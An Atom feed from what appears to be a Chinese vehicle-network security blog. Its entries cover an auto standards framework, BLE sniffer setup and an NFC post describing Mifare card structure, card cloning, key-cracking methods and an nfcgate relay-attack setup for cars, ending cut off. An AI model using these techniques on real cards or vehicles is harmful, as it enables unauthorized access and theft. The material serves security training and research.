<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xyzper.github.io</id>
    <title>xyzper&apos;s 车联网安全博客</title>
    <updated>2023-07-27T03:45:47.451Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://xyzper.github.io"/>
    <link rel="self" href="https://xyzper.github.io/atom.xml"/>
    <subtitle>此身天地一蘧庐，世事消磨绿鬓疏。</subtitle>
    <logo>https://xyzper.github.io/images/avatar.png</logo>
    <icon>https://xyzper.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, xyzper&apos;s 车联网安全博客</rights>
    <entry>
        <title type="html"><![CDATA[智能网联汽车标准体系框架]]></title>
        <id>https://xyzper.github.io/post/_8tgjsTGh/</id>
        <link href="https://xyzper.github.io/post/_8tgjsTGh/">
        </link>
        <updated>2023-07-27T01:37:45.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>内容来自于国家车联网产业标准体系建设指南（智能网联汽车）（2023 版）</p>
</blockquote>
<p>按照智能网联汽车标准体系的技术逻辑架构，综合考虑不同功能、产品和技术类型、各子系统之间的交互关系，将智能网联汽车标准体系划分为三个层级。其中，第一层级规定了智能网联汽车标准体系的基本分类，即基础、通用规范、产品与技术应用三个部分；第二层级根据标准内容范围和技术等级，细分形成 14 个二级分类；第三层级按照技术逻辑，进一步细化形成 23 个三级分类，从而形成了逻辑清晰、内容完整、结构合理、界限分明的标准体系框架。</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307270947945.jpg" alt="" loading="lazy"></figure>
<p><img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307271124151.png" alt="" loading="lazy"><br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307271125263.png" alt="" loading="lazy"><br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307271126567.png" alt="" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307271129640.png" alt="" loading="lazy"><br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307271129294.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[nRF52840BLE抓包工具配置教程]]></title>
        <id>https://xyzper.github.io/post/nrf52840ble-zhua-bao-gong-ju-pei-zhi-jiao-cheng/</id>
        <link href="https://xyzper.github.io/post/nrf52840ble-zhua-bao-gong-ju-pei-zhi-jiao-cheng/">
        </link>
        <updated>2023-07-24T02:57:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="使用nrf52840进行ble抓包教程">使用nRF52840进行BLE抓包教程</h1>
<h2 id="准备工作">准备工作</h2>
<ul>
<li>nRF52840硬件设备 <a href="https://www.nordicsemi.com/Products/nRF52840">SOC芯片购买链接</a>  抓包嗅探模组请找其他网销渠道</li>
<li>Wireshark安装包 <a href="https://www.wireshark.org/download.html">下载链接</a></li>
<li>nRF Connect <a href="https://github.com/NordicSemiconductor/pc-nrfconnect-launcher/releases/download/v3.7.1/nrfconnect-setup-3.7.1-ia32.exe">下载链接</a></li>
<li>nrf_sniffer_for_bluetooth_le 软件包 <a href="https://www.nordicsemi.com/Products/Development-tools/nrf-sniffer-for-bluetooth-le/download#23infotabs">下载链接</a></li>
<li>Python3</li>
</ul>
<h2 id="刷写嗅探抓包固件">刷写嗅探抓包固件</h2>
<ol>
<li>打开nRF Connect for Desktop并启动nRF Connect Programmer。</li>
<li>将nRF52840软件狗插入计算机上的USB端口。</li>
<li>按下RESET（重置）按钮，将nRF模组置于引导加载程序模式。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241003681.svg" alt="nRF-view" loading="lazy"></li>
<li>在应用程序的导航栏中，单击SELECT DEVICE，然后从下拉列表中选择出现设备的序列号。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241010563.jpg" alt="SELECT-DEVICE" loading="lazy"></li>
<li>拖拽nrf_sniffer_for_bluetooth_le软件包中的HEX文件夹下的sniffer_nrf52840dongle_nrf52840_4.1.1.hex到File memory layoutzhong视图上。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241014679.jpg" alt="HEXin" loading="lazy"></li>
<li>点击左侧DEVICE栏中的Write等待固件刷写完毕。</li>
</ol>
<blockquote>
<p>写入过程完成后，设备将重置，除非应用程序使用DFU触发，否则加密狗将不再显示在Programmer应用程序中，因为它不再处于引导加载程序模式,即无法再重新用此方式刷写，所以务必选择正确的HEX文件。</p>
</blockquote>
<ol start="7">
<li>刷写成功后打开设备管理器可以看到系统识别出nRF设备为COM口。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241023905.png" alt="com28" loading="lazy"></li>
</ol>
<h2 id="wireshark-ble抓包配置">Wireshark BLE抓包配置</h2>
<ol>
<li>打开 wireshark 依次点击<code>帮助</code> &gt;&gt; <code>关于Wireshark</code> &gt;&gt; <code>文件夹</code> 打开Global Extcap path对应的文件夹，将软件包内extcap文件夹的内容全部复制到该目录中。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241032511.jpg" alt="extcap" loading="lazy"></li>
<li>在该文件夹的地址栏处输入cmd并点击回车，打开命令提示符。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241035719.png" alt="cmd" loading="lazy"></li>
<li>输入<code>pip install -r requirements.txt</code> 安装所需的python软件包。</li>
<li>再次打开Personal Extcap path对应的文件夹，将软件包内Profile_nRF_Sniffer_Bluetooth_LE文件夹复制到该目录中。</li>
<li>点击wireshark右下角的配置将其选择为<code>Profile_nRF_Sniffer_Bluetooth_LE</code>。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241041671.jpg" alt="LE" loading="lazy"></li>
<li>重新打开Wireshark，在捕获接口中选择 nRF Sniffer for Bluetooth LE COM**，双击打开即可开始抓包。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241043928.jpg" alt="selectinter" loading="lazy"></li>
<li>显示如下界面即为配置完成。<br>
<img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241046838.jpg" alt="sniffer" loading="lazy"></li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BLE安全入门分析（一）]]></title>
        <id>https://xyzper.github.io/post/ble-an-quan-ru-men-fen-xi-yi/</id>
        <link href="https://xyzper.github.io/post/ble-an-quan-ru-men-fen-xi-yi/">
        </link>
        <updated>2023-07-14T09:34:21.000Z</updated>
        <summary type="html"><![CDATA[<p>作为一个从来没有接触过蓝牙安全的小白一直对蓝牙协议栈望而生畏，然鹅这次接到的项目里面有蓝牙安全的培训需求，恰好我们这边懂蓝牙的大佬已经离职了，无奈被迫零基础学蓝牙。<br>
现在培训以及结束了，遂把这次学习过程记录下来。</p>
]]></summary>
        <content type="html"><![CDATA[<p>作为一个从来没有接触过蓝牙安全的小白一直对蓝牙协议栈望而生畏，然鹅这次接到的项目里面有蓝牙安全的培训需求，恰好我们这边懂蓝牙的大佬已经离职了，无奈被迫零基础学蓝牙。<br>
现在培训以及结束了，遂把这次学习过程记录下来。</p>
<!-- more -->
<h1 id="蓝牙协议栈的学习">蓝牙协议栈的学习</h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NFC技术分享]]></title>
        <id>https://xyzper.github.io/post/nfc-ji-zhu-fen-xiang/</id>
        <link href="https://xyzper.github.io/post/nfc-ji-zhu-fen-xiang/">
        </link>
        <updated>2023-06-01T02:17:55.000Z</updated>
        <summary type="html"><![CDATA[<p>大学期间就一直在零零散散的去研究NFC了，M1的那一套已经是研究的差不多了，许多厂家的门jin和Watercard都搞过，但是那些数据分析方法不好发出来，有兴趣的自己研究吧，我这里只是NFC这个技术本身的影响不涉及那些数据的。CPU卡也研究了一部分，主要是针对1208CPU卡的指令集的，等有时间了再继续整理。</p>
]]></summary>
        <content type="html"><![CDATA[<p>大学期间就一直在零零散散的去研究NFC了，M1的那一套已经是研究的差不多了，许多厂家的门jin和Watercard都搞过，但是那些数据分析方法不好发出来，有兴趣的自己研究吧，我这里只是NFC这个技术本身的影响不涉及那些数据的。CPU卡也研究了一部分，主要是针对1208CPU卡的指令集的，等有时间了再继续整理。</p>
<!-- more -->
<h1 id="nfc技术分享">NFC技术分享</h1>
<h2 id="rfid相关">RFID相关</h2>
<p>射频技术（RF）是Radio Frequency的缩写。较常见的应用有无线射频识别（Radio Frequency Identification，RFID），常称为感应式电子晶片或近接卡、感应卡、非接触卡、电子标签、电子条码等。其原理为由扫描器发射一特定频率之无线电波能量给接收器，用以驱动接收器电路将内部的代码送出，此时扫描器便接收此代码。</p>
<p>接收器的特殊在于免用电池、免接触、免刷卡故不怕脏污，且晶片密码为世界唯一无法复制，安全性高、长寿命。RFID的应用非常广泛，典型应用有动物晶片、汽车晶片防盗器、门禁管制、停车场管制、生产线自动化、物料管理。</p>
<p><strong>标签(Tag)</strong></p>
<p>由耦合元件及芯片组成，每个标签具有唯一的电子编码，附着在物体上标识目标对象</p>
<p><strong>阅读器(Reader)</strong></p>
<p>读取(有时还可以写入)标签信息的设备，可设计为手持式或固定式</p>
<p><strong>天线(Antenna)</strong></p>
<p>在标签和读取器间传递射频信号。</p>
<p>RFID标签有两种：有源标签和<strong>无源标签</strong>。其中高频有源标签UHF被广泛应用于交通运输行业，高速收费路口使用的ETC就是一种UHF。</p>
<h2 id="设备补充内容">设备补充内容</h2>
<h3 id="卡片分类"><strong>卡片分类</strong></h3>
<p>分类方式有很多，IC卡ID卡　接触式IC卡　非接触式IC卡　双界面卡　S50卡 T5577卡.......</p>
<p><strong>比如接触式IC卡</strong>（当前使用广泛的是接触型IC卡，其表面可以看到一个方型镀金接口，共有八个或六个镀金触点，用于与读写器接触，通过电流信号完成读写。读写操作（称为刷卡）时须将IC卡插入读写器，读写完毕，卡片自动弹出，或人为抽出。接触式IC卡刷卡相对慢，但可靠性高，多用于存储信息量大，读写操作复杂的场合。）</p>
<p><strong>非接触型IC卡</strong>  具有接触式IC卡同样的芯片技术和特性，最大的区别在于卡上设有射频信号或红外线收发器，在一定距离内即可收发读写器的信号，因而和读写设备之间无机械接触。<br>
在前述IC卡的电路基础上带有射频收发及相关电路的非接触IC卡被称作“射频卡”或“RF卡”。 这种IC卡常用于身份验证，电子门禁等场合。卡上记录信息简单，读写要求不高，卡型变化也较大，可以作成徽章等形式。</p>
<h4 id="低频卡"><strong>低频卡</strong></h4>
<p>125KHz和134KHz</p>
<p>ID卡 只读卡 序列串</p>
<p>HID卡</p>
<p>ID复制卡：</p>
<p>T5577卡/5200卡</p>
<p>8678卡 125k/175k/250k/300k/375k/500k</p>
<p>F8268卡 125k/250k</p>
<h4 id="高频卡-14443a"><strong>高频卡 -14443A</strong></h4>
<p>13.56MHz， 主要是Philips的Mifare系列</p>
<p>M1 S50卡</p>
<p>普通IC卡，0扇区不可以修改，其他扇区可反复擦写，我们使用的电梯卡、门禁卡等智能卡发卡商所使用的都是 M1 卡，可以理解为物业发的原卡。</p>
<p>UID卡 （国外称GEN1）</p>
<p>可以修改任意扇区，作为M1复制的子卡，主要应用在IC卡复制上。该卡片完全兼容mifare 1k卡片。卡片的block0（UID所在的block）可以任意修改，重复修改。</p>
<p>CUID卡(国外称GEN2)</p>
<p>可擦写防屏蔽卡，可以重复擦写所有扇区，UID卡复制无效的情况下使用，可以绕过防火墙。</p>
<p>FUID卡</p>
<p>不可擦写防屏蔽卡，此卡的特点0扇区只能写入一次，写入一次变成 M1 卡，CUID 复制没用的情况下使用，可以绕过防火墙。</p>
<p>CFUID卡</p>
<p>高级复制卡，我们就理解为是 UID 和 FUID 的合成卡，需要封卡操作，不封卡就是 UID 卡，封卡后就变为 M1 卡。</p>
<p>KUID卡</p>
<p>GTU/GUID/GDMIC卡</p>
<p><strong>如何区分ID卡和IC卡？</strong><br>
<img src="https://xyzper.github.io/post-images/1685586186735.png" alt="" loading="lazy"><br>
<img src="https://xyzper.github.io/post-images/1685586209379.png" alt="" loading="lazy"></p>
<h4 id="高频卡-14443b"><strong>高频卡 -14443B</strong></h4>
<p>CPU卡内有COS（可以简单认为是一个微型的系统），典型的卡COS都是固化进ROM的，而还有部分可以修改COS的CPU卡，这种卡COS是写在EEPROM里的，可以多次修改，简直就是神卡啊。不过由于具有COS，加密协议可以自己定义，安全性是十分高的，破解的难度也是非常大的。</p>
<p>二代身份证，社保卡，护照</p>
<p>SRI512卡</p>
<p>SRIX4K卡</p>
<h3 id="m1卡数据分析">M1卡数据分析</h3>
<h4 id="m1卡数据格式">M1卡数据格式</h4>
<p>M1卡有从0到15共16个扇区，每个扇区配备了从0到3共4个段，每个段可以保存16字节的内容，为什么这里要强调从0开始呢？这跟C语言里面数组下标默认从0开始是差不多的，好计算地址偏移，我们不必太过在意，只是要记住是从0开始，写入数据的时候不要写错地方就可以了。每个扇区的第4个段（也就是3段）是用来保存KeyA，KeyB和控制位的，因为M1卡允许每个扇区有一对独立的密码保护，这样能够更加灵活的控制数据的操作，控制位就是这个扇区各种详细权限计算出来的结果。</p>
<p>每张M1卡都有一个全球唯一的UID号，这个UID号保存在卡的第一个扇区（0扇区）的第一段（0段），也称为厂商段，其中前4个字节是卡的UID，第5个字节是卡UID的校验位，剩下的是厂商数据。并且这个段在出厂之前就会被设置了写入保护，只能读取不能修改，当然也有例外，有种叫UID卡的特殊卡，UID是没有设置保护的，其实就是厂家不按规范生产的卡，M1卡出厂是要求要锁死UID的。下图很清晰的列出了M1卡的结构。</p>
<figure data-type="image" tabindex="1"><img src="https://xyzper.github.io/post-images/1685586219208.png" alt="" loading="lazy"></figure>
<table>
<thead>
<tr>
<th style="text-align:left">区块</th>
<th>区块类型</th>
<th>数据内容</th>
<th></th>
<th>块号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">【扇区0】块0</td>
<td>数据块</td>
<td><strong>0C B3 63 61</strong>  <code>BD</code> 08 04 00 02 73 39 F2 22 87 0B 1D</td>
<td>UID卡号<strong>0C B3 63 61</strong></td>
<td>0</td>
</tr>
<tr>
<td style="text-align:left">块1</td>
<td>数据块</td>
<td>A6 AD BF AB A9 B8 AD AB D9 D0 D9 D8 DB D9 10 35</td>
<td>存储数据</td>
<td>1</td>
</tr>
<tr>
<td style="text-align:left">块2</td>
<td>数据块</td>
<td>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</td>
<td>存储数据</td>
<td>2</td>
</tr>
<tr>
<td style="text-align:left">块3</td>
<td>控制块</td>
<td>BC FE B8 35 31 85 <strong>7F 07 88 99</strong> C7 17 0D 44 62 AD</td>
<td>控制位<strong>7F 07 88 99</strong></td>
<td>3</td>
</tr>
<tr>
<td style="text-align:left">【扇区1】块0</td>
<td>数据块</td>
<td></td>
<td></td>
<td>4</td>
</tr>
<tr>
<td style="text-align:left">块1</td>
<td>数据块</td>
<td></td>
<td></td>
<td>5</td>
</tr>
<tr>
<td style="text-align:left">...</td>
<td>...</td>
<td>.....</td>
<td>.....</td>
<td>....</td>
</tr>
<tr>
<td style="text-align:left">块3</td>
<td>控制块</td>
<td></td>
<td></td>
<td>59</td>
</tr>
<tr>
<td style="text-align:left">块0</td>
<td>数据块</td>
<td>00 00 15 F4 00 00 00 00 00 00 00 00 05 0D 43 95</td>
<td>余额‭56.20‬</td>
<td>60</td>
</tr>
<tr>
<td style="text-align:left">块1</td>
<td>数据块</td>
<td>00 00 15 F4 00 00 00 00 00 00 00 00 05 0D 43 95</td>
<td></td>
<td>61</td>
</tr>
<tr>
<td style="text-align:left">块2</td>
<td>数据块</td>
<td>00 00 00 00 00 00 00 00 00 00 00 00 00 00 AA 2E</td>
<td></td>
<td>62</td>
</tr>
<tr>
<td style="text-align:left">块3</td>
<td>控制块</td>
<td>密钥+控制位+密钥</td>
<td></td>
<td>63</td>
</tr>
</tbody>
</table>
<h4 id="控制位详解">控制位详解</h4>
<p>​     这个是每个扇区 最后一块的存储控制结构，一共4个字节，例如：（<strong>7F 07 88 99</strong>） 。这里记住一个特殊的数据 <strong>FF 07 80 69</strong></p>
<table>
<thead>
<tr>
<th style="text-align:right">BC FE B8 35 31 85</th>
<th style="text-align:center"><strong>7F 07 88 99</strong></th>
<th style="text-align:left">C7 17 0D 44 62 AD</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">密钥A</td>
<td style="text-align:center">控制位</td>
<td style="text-align:left">密钥B</td>
</tr>
</tbody>
</table>
<p>其中<strong>7F 07 88 99</strong>是四个16进制位， 这些数字是16进制的数字，然后一个1byte（字节）=8bits，所以他们的结构如下：</p>
<table>
<thead>
<tr>
<th>控制位\bit</th>
<th>7</th>
<th>6</th>
<th>5</th>
<th>4</th>
<th>3</th>
<th>2</th>
<th>1</th>
<th>0</th>
</tr>
</thead>
<tbody>
<tr>
<td>7F</td>
<td>C23_b</td>
<td>C22_b</td>
<td>C21_b</td>
<td>C20_</td>
<td>C13_b</td>
<td>C12_b</td>
<td>C11_b</td>
<td>C10_b</td>
</tr>
<tr>
<td>07</td>
<td>C13</td>
<td>C12</td>
<td>C11</td>
<td>C10</td>
<td>C33_b</td>
<td>C32_b</td>
<td>C31_b</td>
<td>C30_b</td>
</tr>
<tr>
<td>88</td>
<td>C33</td>
<td>C32</td>
<td>C31</td>
<td>C30</td>
<td>C23</td>
<td>C22</td>
<td>C21</td>
<td>C20</td>
</tr>
<tr>
<td>99</td>
<td>预留</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>控制位\bit</th>
<th>7</th>
<th>6</th>
<th>5</th>
<th>4</th>
<th>3</th>
<th>2</th>
<th>1</th>
<th>0</th>
</tr>
</thead>
<tbody>
<tr>
<td>7F</td>
<td>C23_b</td>
<td>C22_b</td>
<td>C21_b</td>
<td>C20_b</td>
<td>C13_b</td>
<td>C12_b</td>
<td>C11_b</td>
<td>C10_b</td>
</tr>
<tr>
<td>0111 1111</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>07</td>
<td>C13</td>
<td>C12</td>
<td>C11</td>
<td>C10</td>
<td>C33_b</td>
<td>C32_b</td>
<td>C31_b</td>
<td>C30_b</td>
</tr>
<tr>
<td>0000 0111</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>88</td>
<td>C33</td>
<td>C32</td>
<td>C31</td>
<td>C30</td>
<td>C23</td>
<td>C22</td>
<td>C21</td>
<td>C20</td>
</tr>
<tr>
<td>1000 1000</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>99</td>
<td>预留</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>三个控制位以正和反两种形式存在于存取控制字节中，决定了该块的访问权限（如： 进行减值操作必须验证KEY A，进行加值操作必须验证KEY B，等等）。因为控制字是由部分控制位取反的来的，由上表C33_b就可知道，所以我们要再取反一次获取原来的控制位，就能得出下面的控制位（_b为取反，比如：C33为1取反后为C33_b为0）</p>
<p>7F0788  99</p>
<p>1000 0000</p>
<p>0000 1000</p>
<p>1000 1000</p>
<p>在存取控制中每个块都有相应的三个控制位,定义如下：</p>
<p>块0：  C10  C20  C30                                                      0      0      0     权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。</p>
<p>块1：  C11  C21  C31                                                       0      0      0    权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。</p>
<p>块2：  C12  C22  C32       对应上表数据可得——            0      0      0    权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。</p>
<p>块3：  C13  C23  C33                                                       0      1      1    权限为： 通过B密码认证后可读，可写。</p>
<figure data-type="image" tabindex="2"><img src="pic%5C%E5%AD%98%E5%8F%96%E6%8E%A7%E5%88%B6%E4%BD%8D.png" alt="" loading="lazy"></figure>
<p><strong>FF 07 80 69</strong>    默认出厂控制位</p>
<h4 id="提高密钥的保密性">提高密钥的保密性</h4>
<p>通过更改控制位来使得必须获取AB密钥的全部内容才可以读写数据，或者更加严格的规则。</p>
<h4 id="一卡一密">一卡一密</h4>
<p>难度太高，内容待定</p>
<h3 id="nfc破解工具"><strong>NFC破解工具</strong></h3>
<h4 id="proxmark3-easy"><strong>Proxmark3 Easy</strong></h4>
<p>国内翻版的pm3设备，可以使用国产固件也可以使用官方的offical或者RRG固件，也可以使用冰人固件，快速响应中国后门，价格便宜，性能强，但较官方版本相比嗅探能力略有不足。</p>
<h4 id="proxmark3-rdv4"><strong>Proxmark3 rdv4</strong></h4>
<p>rdv4是目前官方发布的最新版本，与国产的Proxmark3 X 版本功能基本类似，带有蓝牙无线连接、在线嗅探、离线嗅探等多种功能。<br>
缺点：价格较贵</p>
<h4 id="chameleon-e版g版"><strong>chameleon E版/G版</strong></h4>
<p>E版本的模拟功能较弱，会被绝大部分的防火墙检测到，所以E版本的变色龙模拟出来的NFC卡大概率无法识别，不如UID卡复制来的快。</p>
<p>G版本的模拟功能较强，一个变色龙设备可以模拟8张M1卡，按键切换。</p>
<p>两个版本均支持嗅探，可以嗅探出一个或多个密钥。</p>
<h4 id="pn532">PN532</h4>
<p>一个最基础款的NFC读写模块，通过ch340串口工具可以接入到笔记本上，直接实现对存在PRNG weak的卡片爆破密钥，不过效率较慢。但是PN532存在空闲针脚，曾有想法通过其他空闲针脚来实现模拟一张M1卡，或可以成为NFC中继攻击的一种解决方案（只适用于M1卡，CPU卡无法使用）。</p>
<h4 id="acr122">ACR122</h4>
<p>ACR122是研究CPU卡的必备工具，但是购买的时候小心部分商家拿内置的532当122出来卖。<br>
<img src="https://xyzper.github.io/post-images/1685586256512.jpg" alt="" loading="lazy"><br>
<img src="https://xyzper.github.io/post-images/1685586270016.png" alt="" loading="lazy"></p>
<p>除此之外还有很多其他型号的NFC读写工具，其中还有很多具有特殊功能的设备。如、SONY_RCS360 、SCM_SCL3712等。</p>
<h3 id="nfc卡片类型判断"><strong>NFC卡片类型判断</strong></h3>
<blockquote>
<p>这里展示都是常见的NFC卡类型，像一些特殊的卡片类型没有做展示。</p>
</blockquote>
<p>通过proxmark3判断NFC卡片类型 （高频卡 ）</p>
<p>命令：hf 14a info<br>
该卡为CPU卡，使用的加密芯片和加密算法要视情况而且，目前（2022.06）只有部分门禁系统的CPU卡可以破解并复制，特殊用途的卡片均不可复制，如银行卡、汽车卡片钥匙、身份证等。其中CPU卡分为CPU模拟卡和纯CPU卡</p>
<p>该卡为UID卡 存在Magic后门可以直接使用魔法指令写入或读取数据而无需密钥，一般作为复制卡使用。</p>
<p>该卡为普通M1卡，虽然不存在后门但是Prng weak 可以通过特殊手段直接破解密钥。</p>
<h1 id="破解实现">破解实现</h1>
<h2 id="m1卡破解复制">M1卡破解复制</h2>
<p>主要芯片：Mifare UtraLight IC U1、Mifare DESFire 4K；Legic MIM256 ；ST  SR176、SRIX4K；I·CODE 1、 I·CODE 2；Tag-it HF-I、Tag-it TH-CB1A；Temic  e5551；Atmel T5557、Atmel T5567、Atmel AT88RF256-12 ；Hitag1、 Hitag 2；μEM  EM4100、EM 4102、 EM4069、EM4150；TK4100；Inside 2K、Inside 16K</p>
<p>卡片的安全性测试，我个人的总体流程就是如下：</p>
<p>首先，判断卡的类型，是IC还是ID。<br>
如果是ID卡，那么</p>
<blockquote>
<p>读卡片ID→换白卡→写入ID卡号→克隆完成→攻击成功</p>
</blockquote>
<p>ID卡是低频卡，思路比较简单，IC卡为高频卡，攻击的思路可不少。</p>
<p>IC卡的总体思路如下：</p>
<blockquote>
<p>漏洞测试→获取全卡数据→换上UID卡→写入数据→攻击成功</p>
</blockquote>
<p>如果执行数据修改，思路如下：</p>
<blockquote>
<p>漏洞测试→读全卡数据→解密卡片数据→破解厂商算法→修改数据→攻击成功。</p>
</blockquote>
<p>（1）暴力破解</p>
<p>暴力破解是破解工作永远的话题，只要你拥有庞大的计算资源，管你什么密码都能破解。而且，在CRYPTO1算法的细节没有被泄露之前，最有效的方法就是暴破了。还有一个很重要的原因就是，M1卡是被动卡，需要读卡器为它提供能量，一旦读卡器切断了电源，卡中的临时数据就会丢失，这样就没有办法记录下攻击者究竟输错了多少次密码，卡永远不会因为密码输入错误太多而被锁定，只要攻击者有时间慢慢跟它耗，密码肯定会出来的。</p>
<p>（2）重放攻击</p>
<p>重放攻击是基于M1卡的PRNG算法漏洞实现的，当卡接近读卡器获得能量的时候，就会开始生成随机数序列，但这有一个问题，因为卡是被动式卡，本身自己不带电源，所以断电后数据没办法保存，这时基于LSRF的PRNG算法缺陷就出来了，每次断电后再重新接入电，卡就会生成一摸一样的随机数序列，所以我们就有可能把这个序列计算出来，所以只有我们控制好时间，就能够知道在获得能量后的某一刻时间的随机数是多少，然后进行重放攻击，就有可能篡改正常的数据。如果卡的所有权在我们手上的时候，我们甚至不需要浪费太多的时间就可以实现。</p>
<p>（3）克隆卡片</p>
<p>这是一个很简单也很实用的方法，因为M1卡自带扇区可以保存数据，所以大部分的卡片会选择加密扇区后将数据保存在里面，所以我们完全可以克隆一张带有一样数据的克隆卡。这就会用到一种叫uid卡的特殊M1模拟卡，前面说到每张M1卡在0扇区第1段都会有一个全球唯一的UID编号，而且这个块在出厂之后是被厂商设定保护无法修改的，uid卡就是没有设定0扇区保护的卡，所以你可以随意的修改你想要的uid，这样我们就可以克隆出一张连uid都相同的卡片了。</p>
<p>（4）密钥流窃听</p>
<p>利用神器proxmark 3可以嗅探到全部扇区都加密的M1卡，在卡和已经授权的读卡器交换数据的时候进行窃听，就能把tag数据读取出来，利用XOR算key工具就可以把扇区的密钥计算出来，这也是PRNG算法的漏洞所导致的。</p>
<p>（5）验证漏洞</p>
<p>验证漏洞是目前使用最多的M1破解手段，在读卡器尝试去读取一个扇区时，卡会首先发一个随机数给读卡器，读卡器接到随机数之后利用自身的算法加密这个随机数再反馈回给卡，卡再用自己的算法计算一次，发现结果一致的话就认为读卡器是授权了的，然后就用开始自己的算法加密会话并跟读卡器进行传送数据。这时候问题就来了，当我们再次尝试去访问另一个扇区，卡片又会重复刚才那几个步骤，但此时卡跟读卡器之间的数据交换已经是被算法加密了的，而这个算法又是由扇区的密钥决定的，所以密钥就被泄露出来了。因此验证漏洞要求我们至少知道一个扇区的密钥，但目前大部分的扇区都没有全部加密，所以很容易就会被破解。</p>
<h2 id="嗅探获取密钥"><strong>嗅探获取密钥</strong></h2>
<p>手头没有卡做演示，暂搁置。有机会回来补上</p>
<h2 id="nfc中继攻击"><strong>NFC中继攻击</strong></h2>
<p><a href="https://github.com/nfcgate/nfcgate">GitHub - nfcgate/nfcgate: An NFC research toolkit application for Android</a><br>
1、需要准备：<br>
Google pixel4 *2 (至少有一台Root)<br>
Release nfcgate.APK <a href="https://github.com/nfcgate/nfcgate/releases">直达链接</a></p>
<p>2、搭建nfcgate Server<a href="https://github.com/nfcgate/server">直达链接</a><br>
server运行 一键执行即可<code>python server.py</code><br>
3、两台手机均连接到运行的server<br>
在设置中填写Hostname，Port默认5566，Session只要两个手机一致即可。<br>
连接正常提示 <code>Network: Connected, wait for partner</code><br>
<img src="https://xyzper.github.io/post-images/1685587289523.jpg" alt="" loading="lazy"><br>
两台设备都填写成功上线的话RelayMode会出现绿色提示。<br>
<img src="https://xyzper.github.io/post-images/1685587356489.png" alt="" loading="lazy"><br>
4、使用Relay Mode<br>
模拟卡的那个手机必须要Root，也就是点TAG显示wait for reader的那个。<br>
然后拿着两个手机一个刷卡 一个刷车就好了。</p>
<h2 id="cpu卡片破解">CPU卡片破解</h2>
<p>这里做个提示需要去学习1208cpu卡，具体资料不合规，来源请自行寻找。</p>
<p>NFC中继攻击曾在好多个车型中复现成功，之前一直是不知道怎么修复，认为是技术实现的缺陷（NFC的工作机制导致其可被中继攻击），后来发现只要跟开发商提安全需求是可以修复的，具体的原理没深究过。现在也陆续发现部分车型已经不能复现成功了。</p>
<h1 id="参考链接">参考链接</h1>
<h3 id="官方github">官方GitHub</h3>
<p><a href="https://github.com/RfidResearchGroup">RfidResearchGroup</a>/<strong><a href="https://github.com/RfidResearchGroup/RFIDtools">RFIDtools</a></strong></p>
<p><a href="https://github.com/RfidResearchGroup">RfidResearchGroup</a>/<strong><a href="https://github.com/RfidResearchGroup/proxmark3">proxmark3</a></strong></p>
<p><a href="https://github.com/RfidResearchGroup">RfidResearchGroup</a>/<strong><a href="https://github.com/RfidResearchGroup/ChameleonMini">ChameleonMini</a></strong></p>
<p><a href="https://github.com/RfidResearchGroup">RfidResearchGroup</a>/<strong><a href="https://github.com/RfidResearchGroup/homebrew-proxmark3">homebrew-proxmark3</a></strong></p>
<p><a href="https://github.com/RfidResearchGroup">RfidResearchGroup</a>/<strong><a href="https://github.com/RfidResearchGroup/ChameleonBLEAPI">ChameleonBLEAPI</a></strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[栈溢出]]></title>
        <id>https://xyzper.github.io/post/zhan-yi-chu/</id>
        <link href="https://xyzper.github.io/post/zhan-yi-chu/">
        </link>
        <updated>2023-05-05T06:32:48.000Z</updated>
